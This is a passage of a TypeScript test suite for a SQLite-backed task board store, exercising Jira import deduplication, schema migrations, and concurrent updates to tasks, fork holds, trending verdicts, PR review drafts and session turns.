			stage: "todo",
			state: "queued",
			topic: "jira",
		});
		expect(await store.jiraImported(site, ["A-1", "B-1", "Z-9"])).toEqual(
			new Map([
				["A-1", r.filed[0]?.id ?? ""],
				["B-1", todo.filed[0]?.id ?? ""],
			]),
		);
	});

	test("a second import of the same site and keys skips them; another site does not", async () => {
		const store = await open(join(root, "jira-dup"));
		await store.fileJiraCards({
			site,
			stage: "backlog",
			items: items("A-1", "A-2"),
			now: 1,
		});
		const before = (await store.listTasks()).length;
		const again = await store.fileJiraCards({
			site,
			stage: "backlog",
			items: items("A-1", "A-2", "A-1"),
			now: 2,
		});
		expect(again).toEqual({ filed: [], skipped: ["A-1", "A-2", "A-1"] });
		expect(await store.listTasks()).toHaveLength(before);
		const other = await store.fileJiraCards({
			site: "https://jira.corp",
			stage: "backlog",
			items: items("A-1"),
			now: 3,
		});
		expect(other.filed).toHaveLength(1);
		expect(other.skipped).toEqual([]);
	});

	test("a key repeated in one call files one card", async () => {
		const store = await open(join(root, "jira-repeat"));
		const r = await store.fileJiraCards({
			site,
			stage: "backlog",
			items: items("A-1", "A-1"),
			now: 1,
		});
		expect(r.filed).toHaveLength(1);
		expect(r.skipped).toEqual(["A-1"]);
	});

	test("a cancelled card still counts as imported", async () => {
		const store = await open(join(root, "jira-cancel"));
		const [card] = (
			await store.fileJiraCards({
				site,
				stage: "backlog",
				items: items("A-1"),
				now: 1,
			})
		).filed;
		if (!card) throw new Error("no card");
		await store.updateTask(card.id, { cancelledAt: 5 });
		expect((await store.jiraImported(site, ["A-1"])).get("A-1")).toBe(card.id);
		expect(
			(
				await store.fileJiraCards({
					site,
					stage: "todo",
					items: items("A-1"),
					now: 2,
				})
			).skipped,
		).toEqual(["A-1"]);
	});

	test("a key whose task row is gone imports again", async () => {
		const dir = join(root, "jira-gone");
		let store = await open(dir);
		const [card] = (
			await store.fileJiraCards({
				site,
				stage: "backlog",
				items: items("A-1"),
				now: 1,
			})
		).filed;
		if (!card) throw new Error("no card");
		await store.close();
		const raw = new Database(join(dir, ".tasks", "tasks.db"));
		raw.run("DELETE FROM tasks WHERE id = ?", [card.id]);
		raw.close();
		store = await open(dir);
		expect((await store.jiraImported(site, ["A-1"])).size).toBe(0);
		const again = await store.fileJiraCards({
			site,
			stage: "backlog",
			items: items("A-1"),
			now: 2,
		});
		expect(again.filed).toHaveLength(1);
		expect(again.filed[0]?.id).not.toBe(card.id);
		expect((await store.jiraImported(site, ["A-1"])).get("A-1")).toBe(
			again.filed[0]?.id ?? "",
		);
	});

	test("an old database gains the jira_imports table on open", async () => {
		const dir = join(root, "jira-migration");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		const old = new Database(join(dir, ".tasks", "tasks.db"), { create: true });
		old.exec(
			"CREATE TABLE settings (key TEXT PRIMARY KEY, value TEXT NOT NULL)",
		);
		old.close();
		const store = await open(dir);
		expect(
			(
				await store.fileJiraCards({
					site,
					stage: "backlog",
					items: items("A-1"),
					now: 1,
				})
			).filed,
		).toHaveLength(1);
		await store.close();
		const raw = new Database(join(dir, ".tasks", "tasks.db"));
		const t = raw
			.query<{ name: string }, []>(
				"SELECT name FROM sqlite_master WHERE name = 'jira_imports'",
			)
			.all();
		raw.close();
		expect(t).toEqual([{ name: "jira_imports" }]);
	});
});

describe("gate column", () => {
	test("a fresh database carries the gate column via TASKS_DDL", async () => {
		const store = await open(join(root, "gate-fresh"));
		const task = await store.createTask("gated");
		expect(task.gate).toBeNull();
		await store.updateTask(task.id, {
			gate: {
				hash: "abc",
				seen: null,
				fails: 1,
				sig: "q",
				parked: true,
			},
		});
		expect((await store.getTask(task.id))?.gate).toEqual({
			hash: "abc",
			seen: null,
			fails: 1,
			sig: "q",
			parked: true,
		});
		// undefined keeps the stored value; null clears it.
		await store.updateTask(task.id, { title: "renamed" });
		expect((await store.getTask(task.id))?.gate?.hash).toBe("abc");
		await store.updateTask(task.id, { gate: null });
		expect((await store.getTask(task.id))?.gate).toBeNull();
		await store.close();
	});

	test("an old-schema database without the gate column converges on open", async () => {
		const dir = join(root, "gate-migration");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		const db = new Database(join(dir, ".tasks", "tasks.db"));
		// Shape of a database created before gate existed: the current DDL minus the column.
		db.exec(`CREATE TABLE tasks (
			id TEXT PRIMARY KEY,
			title TEXT,
			prompt TEXT,
			stage TEXT NOT NULL CHECK (stage IN ('todo','in_progress','merging','done','backlog')),
			state TEXT NOT NULL CHECK (state IN ('queued','preparing','running','needs_you','idle')),
			needs_reason TEXT,
			pending_prompt TEXT,
			branch TEXT,
			base TEXT,
			worktree TEXT,
			session_id TEXT,
			summary TEXT,
			details TEXT,
			report TEXT,
			research INTEGER NOT NULL DEFAULT 0,
			research_steps TEXT NOT NULL DEFAULT 'unknown',
			created_at INTEGER NOT NULL,
			updated_at INTEGER NOT NULL,
			queued_at INTEGER,
			cancelled_at INTEGER,
			images TEXT NOT NULL DEFAULT '[]',
			pending_images TEXT NOT NULL DEFAULT '[]',
			shots TEXT NOT NULL DEFAULT '[]',
			release_version TEXT,
			release_notes TEXT,
			session_title TEXT,
			asked TEXT,
			model TEXT,
			kept_files TEXT NOT NULL DEFAULT '[]',
			follow_up_of TEXT,
			push_sha TEXT,
			update_ids TEXT NOT NULL DEFAULT '[]',
			update_merge_approved INTEGER NOT NULL DEFAULT 0,
			revision INTEGER NOT NULL DEFAULT 1
		)`);
		db.exec(
			"INSERT INTO tasks (id, title, stage, state, created_at, updated_at) VALUES ('seed1', 'seeded', 'in_progress', 'idle', 1, 1)",
		);
		db.close();

		const store = await open(dir);
		// The seeded row survives and reads a null gate; a write lands in the new column.
		const seeded = (await store.getTask("seed1")) as Task;
		expect(seeded.gate).toBeNull();
		await store.updateTask("seed1", {
			gate: { hash: null, seen: null, fails: 0, sig: null, parked: false },
		});
		expect((await store.getTask("seed1"))?.gate?.parked).toBe(false);
		await store.close();
		// Reopening is idempotent: the ALTER no longer fires on a converged database.
		const again = await open(dir);
		expect((await again.getTask("seed1"))?.gate?.parked).toBe(false);
		await again.close();
		const raw = new Database(join(dir, ".tasks", "tasks.db"));
		const cols = raw
			.query<{ name: string }, []>(
				"SELECT name FROM pragma_table_info('tasks')",
			)
			.all()
			.map((c) => c.name);
		raw.close();
		expect(cols).toContain("gate");
	});
});

describe("prompt author column", () => {
	// A database from before prompt authorship existed: the current tasks DDL
	// minus the migrated prompt_author column.
	const PRE_AUTHOR_TASKS_DDL = `CREATE TABLE tasks (
		id TEXT PRIMARY KEY,
		title TEXT,
		prompt TEXT,
		stage TEXT NOT NULL CHECK (stage IN ('todo','in_progress','merging','done','backlog')),
		state TEXT NOT NULL CHECK (state IN ('queued','preparing','running','needs_you','idle')),
		needs_reason TEXT,
		pending_prompt TEXT,
		branch TEXT,
		base TEXT,
		worktree TEXT,
		session_id TEXT,
		summary TEXT,
		details TEXT,
		report TEXT,
		research INTEGER NOT NULL DEFAULT 0,
		research_steps TEXT NOT NULL DEFAULT 'unknown',
		created_at INTEGER NOT NULL,
		updated_at INTEGER NOT NULL,
		queued_at INTEGER,
		cancelled_at INTEGER,
		images TEXT NOT NULL DEFAULT '[]',
		pending_images TEXT NOT NULL DEFAULT '[]',
		shots TEXT NOT NULL DEFAULT '[]',
		release_version TEXT,
		release_notes TEXT,
		session_title TEXT,
		asked TEXT,
		gate TEXT,
		model TEXT,
		kept_files TEXT NOT NULL DEFAULT '[]',
		follow_up_of TEXT,
		push_sha TEXT,
		update_ids TEXT NOT NULL DEFAULT '[]',
		update_merge_approved INTEGER NOT NULL DEFAULT 0,
		revision INTEGER NOT NULL DEFAULT 1
	)`;

	test("an old-schema database backfills rows to 'user' on open and round-trips board authorship", async () => {
		const dir = join(root, "prompt-author-migration");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		const db = new Database(join(dir, ".tasks", "tasks.db"));
		db.exec(PRE_AUTHOR_TASKS_DDL);
		db.exec(
			"INSERT INTO tasks (id, title, stage, state, created_at, updated_at) VALUES ('seed1', 'seeded', 'in_progress', 'idle', 1, 1)",
		);
		db.close();

		const store = await open(dir);
		// The seeded row survives and backfills to the user default.
		expect((await store.getTask("seed1"))?.promptAuthor).toBe("user");
		// New cards start as user-authored; a board write lands in the added column.
		const card = await store.createTask("board filed this");
		expect(card.promptAuthor).toBe("user");
		await store.updateTask(card.id, { promptAuthor: "board" });
		expect((await store.getTask(card.id))?.promptAuthor).toBe("board");
		await store.close();
		// The board value persists across a reopen.
		const reopened = await open(dir);
		expect((await reopened.getTask(card.id))?.promptAuthor).toBe("board");
		// A user edit makes the prompt user-authored again.
		await reopened.editTask(card.id, "user rewrote this");
		expect((await reopened.getTask(card.id))?.promptAuthor).toBe("user");
		await reopened.close();
	});

	test("an old-schema database with no rows opens without error", async () => {
		const dir = join(root, "prompt-author-migration-empty");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		const db = new Database(join(dir, ".tasks", "tasks.db"));
		db.exec(PRE_AUTHOR_TASKS_DDL);
		db.close();

		const store = await open(dir);
		expect(await store.listTasks()).toEqual([]);
		await store.close();
	});
});

describe("async store serial operations", () => {
	test("concurrent creation preserves IDs, rows, and adjacent lifecycle events", async () => {
		const store = await open(join(root, "async-create"));
		await store.setSettings({ taskIdPrefix: "ASYNC" });
		const cards = await Promise.all([
			...Array.from({ length: 12 }, (_, i) => store.createTask(`card ${i}`)),
			...Array.from({ length: 3 }, () =>
				store.createTask("explicit", null, "work", "same-id"),
			),
		]);
		expect(cards.map((card) => card.id)).toEqual([
			...Array.from({ length: 12 }, (_, i) => `ASYNC-${i + 1}`),
			"same-id",
			"same-id-2",
			"same-id-3",
		]);
		expect(new Set(cards.map((card) => card.id)).size).toBe(15);
		for (const card of cards) {
			expect(await store.getTask(card.id)).toEqual(card);
		}
		const events = await store.events();
		expect(
			events.map((event) => [
				event.kind,
				event.taskId,
				event.from,
				event.to,
				event.detail,
			]),
		).toEqual(
			cards.flatMap((card) => [
				["create", card.id, null, "todo", null],
				["state", card.id, null, "queued", null],
			]),
		);
		expect((await store.createTask("next")).id).toBe("ASYNC-13");
	});

	test("concurrent guarded updates return the winner and emit no conflict events", async () => {
		const store = await open(join(root, "async-revisions"));
		const card = await store.createTask("original");
		const results = await Promise.all([
			store.updateTaskIfCurrent(
				card.id,
				{
					prompt: "winner",
					stage: "in_progress",
					state: "running",
				},
				card.revision,
			),
			store.updateTaskIfCurrent(
				card.id,
				{
					prompt: "loser",
					stage: "backlog",
					state: "idle",
				},
				card.revision,
			),
		]);
		expect(results.map((result) => result.ok)).toEqual([true, false]);
		expect(results[0]?.task).toEqual(results[1]?.task);
		expect(await store.getTask(card.id)).toMatchObject({
			prompt: "winner",
			stage: "in_progress",
			state: "running",
			revision: card.revision + 1,
		});
		expect(
			(await store.events()).map((event) => [event.kind, event.from, event.to]),
		).toEqual([
			["create", null, "todo"],
			["state", null, "queued"],
			["stage", "todo", "in_progress"],
			["state", "queued", "running"],
		]);
		const internal = await Promise.all([
			store.updateTask(card.id, { state: "needs_you" }),
			store.updateTask(card.id, { state: "idle" }),
		]);
		expect(internal.map((task) => [task.revision, task.state])).toEqual([
			[3, "needs_you"],
			[4, "idle"],
		]);
		expect(
			(await store.events())
				.slice(-2)
				.map((event) => [event.kind, event.from, event.to]),
		).toEqual([
			["state", "running", "needs_you"],
			["state", "needs_you", "idle"],
		]);
	});

	test("concurrent prompt edits and holds preserve revision guards", async () => {
		const store = await open(join(root, "async-edit-hold"));
		const card = await store.createTask("original");
		const [edit, hold] = await Promise.all([
			store.editTask(card.id, "new title\nnew body", card.revision),
			store.claimPromptHold(card.id, 12345, card.revision),
		]);
		expect(edit.ok).toBe(true);
		expect(hold.ok).toBe(false);
		expect(hold.task).toEqual(edit.task);
		expect(await store.getTask(card.id)).toMatchObject({
			title: "new title",
			prompt: "new title\nnew body",
			revision: 2,
			holdUntil: null,
		});
		const [claimed, released] = await Promise.all([
			store.claimPromptHold(card.id, 23456, 2),
			store.releasePromptHold(card.id),
		]);
		expect(claimed.ok).toBe(true);
		expect(released).toBeUndefined();
		expect(await store.getTask(card.id)).toMatchObject({
			revision: 2,
			holdUntil: null,
			holdProvider: null,
			holdWindow: null,
		});
		expect(await store.events()).toHaveLength(2);
	});

	test("concurrent queue permutations expose only complete orders", async () => {
		const store = await open(join(root, "async-queue"));
		const cards = await Promise.all(
			["a", "b", "c"].map((p) => store.createTask(p)),
		);
		const [a, b, c] = cards.map((card) => card.id) as [string, string, string];
		const events = await store.events();
		const [first, firstOrder, second, secondOrder, invalid, lastOrder] =
			await Promise.all([
				store.reorderQueue([c, a, b]),
				store.queueIds(),
				store.reorderQueue([b, c, a]),
				store.queueIds(),
				store.reorderQueue([a, a, c]),
				store.queueIds(),
			]);
		expect(first).toBe(true);
		expect(firstOrder).toEqual([c, a, b]);
		expect(second).toBe(true);
		expect(secondOrder).toEqual([b, c, a]);
		expect(invalid).toBe(false);
		expect(lastOrder).toEqual([b, c, a]);
		for (const card of cards) {
			expect((await store.getTask(card.id))?.revision).toBe(card.revision + 2);
		}
		expect(await store.events()).toEqual(events);
	});

	test("concurrent settings patches preserve complete snapshots and disjoint keys", async () => {
		const store = await open(join(root, "async-settings"));
		const [first, snapshot, second] = await Promise.all([
			store.setSettings({
				displayName: "first",
				releaseCommand: "first command",
			}),
			store.getSettings(),
			store.setSettings({ displayName: "second", maxParallel: 7 }),
		]);
		expect(first).toMatchObject({
			displayName: "first",
			releaseCommand: "first command",
			maxParallel: null,
		});
		expect(snapshot).toEqual(first);
		expect(second).toMatchObject({
			displayName: "second",
			releaseCommand: "first command",
			maxParallel: 7,
		});
		expect(await store.getSettings()).toEqual(second);
		expect(await store.events()).toEqual([]);
	});

	test("concurrent fork hold replacements and cleanup expose complete branch sets", async () => {
		const store = await open(join(root, "async-fork-holds"));
		for (const forkId of [1, 2]) {
			await store.saveForkBranch({
				forkId,
				branchHash: "branch",
				branch: "main",
				head: "head",
				analyzedHead: null,
				firstPendingAt: 1,
				lastRunAt: null,
				lastError: null,
				retries: 0,
			});
		}
		const firstRows = [
			{ sha: "a".repeat(40), pr: 1, prHead: "b".repeat(40), released: false },
			{ sha: "c".repeat(40), pr: 2, prHead: "d".repeat(40), released: true },
		];
		const secondRows = [
			{ sha: "e".repeat(40), pr: 3, prHead: "f".repeat(40), released: true },
		];
		await store.setForkHolds(2, "branch", secondRows);
		const [, firstSnapshot, , secondSnapshot, , branches, holds] =
			await Promise.all([
				store.setForkHolds(1, "branch", firstRows),
				store.listForkHolds(1),
				store.setForkHolds(1, "branch", secondRows),
				store.listForkHolds(1),
				store.deleteForkBranchesNotIn([2]),
				store.listAllForkBranches(),
				store.listForkHolds(1),
			]);
		expect(firstSnapshot).toEqual(
			firstRows.map((row) => ({
				...row,
				forkId: 1,
				branchHash: "branch",
				released: row.released ? 1 : 0,
			})),
		);
		expect(secondSnapshot).toEqual(
			secondRows.map((row) => ({
				...row,
				forkId: 1,
				branchHash: "branch",
				released: 1,
			})),
		);
		expect(branches.map((branch) => branch.forkId)).toEqual([2]);
		expect(holds).toEqual([]);
		expect(await store.listForkHolds(2)).toHaveLength(1);
		expect(await store.events()).toEqual([]);
	});

	test("concurrent fork results keep children, cursor changes, and consumed holds together", async () => {
		const store = await open(join(root, "async-fork-results"));
		for (const forkId of [1, 2]) {
			await store.saveForkBranch({
				forkId,
				branchHash: "branch",
				branch: "main",
				head: `head-${forkId}`,
				analyzedHead: null,
				firstPendingAt: 1,
				lastRunAt: null,
				lastError: "retry",
				retries: 2,
			});
			await store.setForkHolds(forkId, "branch", [
				{
					sha: "a".repeat(40),
					pr: forkId,
					prHead: "b".repeat(40),
					released: true,
				},
			]);
		}
		const results = await Promise.all(
			[1, 2].map((forkId) =>
				store.createForkResult({
					prompt: `report ${forkId}`,
					title: `result ${forkId}`,
					report: `findings ${forkId}`,
					topic: "fork research",
					proposals: [{ prompt: `proposal ${forkId}`, model: null }],
					analyzed: [
						{
							forkId,
							branchHash: "branch",
							head: `head-${forkId}`,
							at: 100 + forkId,
							consumed: ["a".repeat(40)],
						},
					],
				}),
			),
		);
		const cards = await store.listTasks();
		expect(cards).toHaveLength(4);
		for (const [i, result] of results.entries()) {
			expect(await store.getTask(result.id)).toEqual(result);
			expect(result).toMatchObject({
				title: `result ${i + 1}`,
				report: `findings ${i + 1}`,
				stage: "done",
				state: "idle",
				research: true,
			});
			const children = cards.filter((card) => card.followUpOf === result.id);
			expect(children).toHaveLength(1);
			expect(children[0]).toMatchObject({
				prompt: `proposal ${i + 1}`,
				state: "needs_you",
				model: null,
			});
			expect(await store.listForkBranches(i + 1)).toMatchObject([
				{
					analyzedHead: `head-${i + 1}`,
					firstPendingAt: null,
					lastRunAt: 101 + i,
					lastError: null,
					retries: 0,
				},
			]);
			expect(await store.listForkHolds(i + 1)).toEqual([]);
			const ownIds = [result.id, children[0]!.id];
			const events = (await store.events()).filter((event) =>
				ownIds.includes(event.taskId ?? ""),
			);
			expect(events.map((event) => [event.kind, event.from, event.to])).toEqual(
				[
					["create", null, "todo"],
					["state", null, "queued"],
					["stage", "todo", "done"],
					["state", "queued", "idle"],
					["create", null, "todo"],
					["state", null, "queued"],
					["state", "queued", "needs_you"],
				],
			);
		}
	});

	test("concurrent trending filings preserve duplicate verdicts and the scout cap", async () => {
		const store = await open(join(root, "async-trending-cap"));
		const scout = await store.createTask("scan", null, "trending");
		const repos = ["owner/one", "OWNER/ONE", "owner/two", "owner/three"];
		const results = await Promise.all(
			repos.map((repo) =>
				store.fileTrendingProposal({
					scoutId: scout.id,
					repo,
					prompt: `adopt ${repo}`,
					cap: 2,
					now: 10,
				}),
			),
		);
		expect(results.map((result) => result.ok)).toEqual([
			true,
			false,
			true,
			false,
		]);
		const verdicts = await store.listTrendingVerdicts();
		expect(verdicts.map((verdict) => verdict.repo).sort()).toEqual([
			"owner/one",
			"owner/two",
		]);
		const cards = await store.listTasks();
		expect(cards).toHaveLength(3);
		for (const verdict of verdicts) {
			expect(verdict).toMatchObject({
				verdict: "filed",
				scoutCardId: scout.id,
				firstSeenAt: 10,
				judgedAt: 10,
			});
			expect(await store.getTask(verdict.proposalCardId!)).toMatchObject({
				stage: "backlog",
				state: "idle",
				followUpOf: scout.id,
				queuedAt: null,
			});
		}
		expect(await store.getTrendingVerdict("owner/three")).toBeNull();
		const events = await store.events();
		expect(events.filter((event) => event.kind === "create")).toHaveLength(3);
		for (const verdict of verdicts) {
			expect(
				events
					.filter((event) => event.taskId === verdict.proposalCardId)
					.map((event) => [event.kind, event.from, event.to]),
			).toEqual([
				["create", null, "todo"],
				["state", null, "queued"],
				["stage", "todo", "backlog"],
				["state", "queued", "idle"],
			]);
		}
	});

	test("concurrent trending judgements preserve final verdicts and first-seen time", async () => {
		const store = await open(join(root, "async-trending-judge"));
		const scout = await store.createTask("scan", null, "trending");
		const events = await store.events();
		const final = await Promise.all([
			store.judgeTrendingRepo({
				scoutId: scout.id,
				repo: "owner/final",
				verdict: "no_fit",
				reason: "first",
				now: 10,
			}),
			store.judgeTrendingRepo({
				scoutId: scout.id,
				repo: "OWNER/FINAL",
				verdict: "deferred",
				reason: "second",
				now: 20,
			}),
		]);
		expect(final.map((result) => result.ok)).toEqual([true, false]);
		expect(await store.getTrendingVerdict("owner/final")).toMatchObject({
			verdict: "no_fit",
			reason: "first",
			firstSeenAt: 10,
			judgedAt: 10,
		});
		expect(
			await Promise.all([
				store.judgeTrendingRepo({
					scoutId: scout.id,
					repo: "owner/later",
					verdict: "deferred",
					reason: "wait",
					now: 30,
				}),
				store.judgeTrendingRepo({
					scoutId: scout.id,
					repo: "owner/later",
					verdict: "no_fit",
					reason: "final",
					now: 40,
				}),
			]),
		).toEqual([{ ok: true }, { ok: true }]);
		expect(await store.getTrendingVerdict("owner/later")).toMatchObject({
			verdict: "no_fit",
			reason: "final",
			firstSeenAt: 30,
			judgedAt: 40,
		});
		expect(await store.events()).toEqual(events);
	});

	test("concurrent duplicate issue filings roll back task IDs and lifecycle events", async () => {
		const store = await open(join(root, "async-issue"));
		await store.setSettings({ taskIdPrefix: "ISSUE" });
		const issue = { number: 7, title: "issue", prompt: "fix issue", now: 10 };
		const results = await Promise.allSettled([
			store.fileIssueCard(issue),
			store.fileIssueCard({ ...issue, now: 20 }),
		]);
		expect(results.map((result) => result.status)).toEqual([
			"fulfilled",
			"rejected",
		]);
		expect(await store.listTasks()).toHaveLength(1);
		expect(await store.getIssueWatch(7)).toEqual({
			number: 7,
			taskId: "ISSUE-1",
			labelled: false,
			filedAt: 10,
		});
		expect(await store.issueCardsFiledSince(0)).toBe(1);
		expect(
			(await store.events()).map((event) => [
				event.kind,
				event.taskId,
				event.from,
				event.to,
			]),
		).toEqual([
			["create", "ISSUE-1", null, "todo"],
			["state", "ISSUE-1", null, "queued"],
			["stage", "ISSUE-1", "todo", "backlog"],
			["state", "ISSUE-1", "queued", "idle"],
		]);
		expect((await store.createTask("next")).id).toBe("ISSUE-2");
	});

	test("concurrent Jira batches create one card and lifecycle per unique key", async () => {
		const store = await open(join(root, "async-jira"));
		const site = "https://acme.atlassian.net";
		const item = (key: string) => ({ key, title: key, prompt: `fix ${key}` });
		const [first, second] = await Promise.all([
			store.fileJiraCards({
				site,
				stage: "backlog",
				items: [item("A-1"), item("A-2")],
				now: 10,
			}),
			store.fileJiraCards({
				site,
				stage: "todo",
				items: [item("A-2"), item("A-3"), item("A-3")],
				now: 20,
			}),
		]);
		expect(first.skipped).toEqual([]);
		expect(first.filed.map((card) => card.title)).toEqual(["A-1", "A-2"]);
		expect(second.skipped).toEqual(["A-2", "A-3"]);
		expect(second.filed.map((card) => card.title)).toEqual(["A-3"]);
		expect(await store.listTasks()).toHaveLength(3);
		expect(await store.jiraImported(site, ["A-1", "A-2", "A-3"])).toEqual(
			new Map([
				["A-1", first.filed[0]!.id],
				["A-2", first.filed[1]!.id],
				["A-3", second.filed[0]!.id],
			]),
		);
		const events = await store.events();
		for (const card of first.filed) {
			expect(await store.getTask(card.id)).toEqual(card);
			expect(
				events
					.filter((event) => event.taskId === card.id)
					.map((event) => [event.kind, event.from, event.to]),
			).toEqual([
				["create", null, "todo"],
				["state", null, "queued"],
				["stage", "todo", "backlog"],
				["state", "queued", "idle"],
			]);
		}
		expect(second.filed[0]).toMatchObject({ stage: "todo", state: "queued" });
		expect(
			events.filter((event) => event.taskId === second.filed[0]!.id),
		).toHaveLength(2);
	});

	test("concurrent PR runs and drafts keep one synchronized review card", async () => {
		const store = await open(join(root, "async-pr-drafts"));
		await store.savePrReview({
			number: 12,
			taskId: null,
			head: "head",
			firstSeenAt: 1,
			reviewedHead: null,
			postedHead: null,
			postedUrl: null,
			postedLogin: null,
			state: "open",
			draft: false,
			title: "PR",
			postError: null,
			commentsAt: null,
			commentsUnseen: false,
		});
		const runs = await Promise.all([
			store.startPrRun(12, "first", 10),
			store.startPrRun(12, "head", 20),
		]);
		expect(new Set(runs).size).toBe(2);
		expect(await store.prReviewRunsSince(0)).toBe(2);
		const drafts = await Promise.all([
			store.savePrDraft({
				run: runs[0]!,
				number: 12,
				head: "first",
				draft: "first draft",
				prompt: "first prompt",
				blocking: true,
			}),
			store.savePrDraft({
				run: runs[1]!,
				number: 12,
				head: "head",
				draft: "second draft",
				prompt: "second prompt",
				blocking: false,
			}),
		]);
		expect(drafts[0]?.id).toBe(drafts[1]?.id);
		expect(drafts[0]).toMatchObject({
			details: "first draft",
			stage: "in_progress",
			state: "needs_you",
		});
		expect(drafts[1]).toMatchObject({
			details: "second draft",
			prompt: "second prompt",
			stage: "in_progress",
			state: "needs_you",
		});
		expect(await store.getTask(drafts[1]!.id)).toEqual(drafts[1]);
		expect(await store.listTasks()).toHaveLength(1);
		expect(await store.getPrReview(12)).toMatchObject({
			taskId: drafts[1]!.id,
			reviewedHead: "head",
			postedHead: null,
		});
		expect(await store.prHeadReviewed(12, "first")).toBe(true);
		expect(await store.prHeadReviewed(12, "head")).toBe(true);
		expect(await store.lastPrRun(12)).toBe(runs[1]!);
		expect(await store.lastPrRunBlocking(12)).toBe(false);
		expect(
			(await store.events()).map((event) => [event.kind, event.from, event.to]),
		).toEqual([
			["create", null, "todo"],
			["state", null, "queued"],
			["stage", "todo", "in_progress"],
			["state", "queued", "idle"],
			["state", "idle", "needs_you"],
		]);
		const posted = await Promise.all([
			store.claimPrPost(12, "head"),
			store.claimPrPost(12, "head"),
		]);
		expect(posted).toEqual([null, undefined]);
		const [postedRow, , , syncedCard] = await Promise.all([
			store.getPrReview(12),
			store.syncPrCard(12),
			store.syncPrCard(12),
			store.getTask(drafts[1]!.id),
		]);
		expect(postedRow).toMatchObject({ postedHead: "head" });
		expect(syncedCard).toMatchObject({ stage: "done", state: "idle" });
		const doneAt = syncedCard!.doneAt;
		const events = await store.events();
		await Promise.all([store.syncPrCard(12), store.syncPrCard(12)]);
		expect((await store.getTask(drafts[1]!.id))?.doneAt).toBe(doneAt);
		expect(await store.events()).toEqual(events);
		expect(events.map((event) => [event.kind, event.from, event.to])).toEqual([
			["create", null, "todo"],
			["state", null, "queued"],
			["stage", "todo", "in_progress"],
			["state", "queued", "idle"],
			["state", "idle", "needs_you"],
			["stage", "in_progress", "done"],
			["state", "needs_you", "idle"],
		]);
	});

	test("concurrent unique findings reset the stamp only for a new prompt", async () => {
		const store = await open(join(root, "async-findings"));
		const card = await store.createTask("review");
		const finding: RecordedFinding = {
			prompt: "first finding",
			model: "test/model",
			rank: 2,
			security: null,
		};
		await store.updateTask(card.id, { findingsCheckedAt: 100 });
		expect(
			await Promise.all([
				store.appendReviewFinding(card.id, finding),
				store.appendReviewFinding(card.id, finding),
				store.appendReviewFinding(card.id, {
					...finding,
					prompt: "second finding",
				}),
			]),
		).toEqual([true, false, true]);
		expect(await store.listReviewFindings(card.id)).toEqual([
			finding,
			{ ...finding, prompt: "second finding" },
		]);
		expect((await store.getTask(card.id))?.findingsCheckedAt).toBeNull();
		await store.updateTask(card.id, { findingsCheckedAt: 200 });
		expect(
			await Promise.all([
				store.appendReviewFinding(card.id, finding),
				store.appendReviewFinding(card.id, {
					...finding,
					prompt: "second finding",
				}),
			]),
		).toEqual([false, false]);
		expect((await store.getTask(card.id))?.findingsCheckedAt).toBe(200);
		await expect(
			store.appendReviewFinding(card.id, {
				...finding,
				prompt: null as unknown as string,
			}),
		).rejects.toThrow(/NOT NULL/);
		expect((await store.getTask(card.id))?.findingsCheckedAt).toBe(200);
		expect(await store.listReviewFindings(card.id)).toEqual([
			finding,
			{ ...finding, prompt: "second finding" },
		]);
		expect(
			await store.appendReviewFinding(card.id, {
				...finding,
				prompt: "third finding",
			}),
		).toBe(true);
		expect((await store.getTask(card.id))?.findingsCheckedAt).toBeNull();
		expect(await store.events()).toHaveLength(2);
	});

	test("concurrent turn inserts return their own rows and completion records matching errors", async () => {
		const store = await open(join(root, "async-turns"));
		const card = await store.createTask("turns");
		const turns = await Promise.all(
			["a", "b", "c"].map((prompt) =>
				store.startTurn(card.id, "work", prompt, null),
			),
		);
		expect(new Set(turns.map((turn) => turn.id)).size).toBe(3);
		expect(turns.map((turn) => turn.prompt)).toEqual(["a", "b", "c"]);
		expect(await store.listTurns(card.id)).toEqual(turns);
		const finished = await Promise.all(
			turns.map((turn, i) =>
				store.finishTurnState(turn.id, {
					endedAt: turn.startedAt + 100 + i,
					error: i === 1 ? "cancelled" : `error-${i}`,
					summary: `summary-${i}`,
				}),
			),
		);
		expect(finished.map((turn) => [turn.id, turn.summary, turn.error])).toEqual(
			[
				[turns[0]!.id, "summary-0", "error-0"],
				[turns[1]!.id, "summary-1", "cancelled"],
				[turns[2]!.id, "summary-2", "error-2"],
			],
		);
		expect(await store.listTurns(card.id)).toEqual(finished);
		expect(
			(await store.events())
				.filter((event) => event.kind === "error")
				.map((event) => [event.taskId, event.from, event.to, event.detail]),
		).toEqual([
			[card.id, null, null, "error-0"],
			[card.id, null, null, "error-2"],
		]);
	});

	test("concurrent title candidates return the saved first winner", async () => {
		const store = await open(join(root, "async-title"));
		const sessionId = "bbbb0000-0000-0000-0000-000000000801";
		const card = await store.updateTask(
			(await store.createTask("fallback")).id,
			{
				sessionId,
			},
		);
		mkdirSync(store.sessionsDir, { recursive: true });
		writeFileSync(
			join(store.sessionsDir, `2026-09-27T10-00-00-000Z_${sessionId}.jsonl`),
			'{"type":"title","v":1,"title":"Transcript candidate"}\n{"type":"session"}\n',
		);
		const events = await store.events();
		const [, title, , readTitle] = await Promise.all([
			store.nameTask(card.id, "Saved winner"),
			store.frozenTitleFrom(card, null),
			store.nameTask(card.id, "Losing candidate"),
			store.frozenTitle(card),
		]);
		expect(title).toBe("Saved winner");
		expect(readTitle).toBe("Saved winner");
		expect(await store.sessionTitle(card)).toBe("Saved winner");
		expect((await store.boardCardFacts()).titles.get(card.id)).toBe(
			"Saved winner",
		);
		expect((await store.getTask(card.id))?.revision).toBe(card.revision);
		expect(await store.events()).toEqual(events);
	});

	test("transcript capture rejects a changed session or turn window", async () => {
		for (const changed of ["session", "window"] as const) {
			const store = await open(join(root, `async-capture-${changed}`));
			const sessionId = "cccc0000-0000-0000-0000-000000000811";
			const card = await store.updateTask(
				(await store.createTask(changed)).id,
				{
					sessionId,
				},
			);
			const turn = await store.startTurn(card.id, "work", "capture", null);
			await store.finishTurnState(turn.id, { endedAt: turn.startedAt + 1000 });
			mkdirSync(store.sessionsDir, { recursive: true });
			writeFileSync(
				join(store.sessionsDir, `2026-09-27T10-00-00-000Z_${sessionId}.jsonl`),
				`${JSON.stringify({
					type: "message",
					timestamp: new Date(turn.startedAt + 100).toISOString(),
					message: {
						role: "assistant",
						provider: "zai",
						model: "test/model",
						usage: {
							input: 10,
							output: 1,
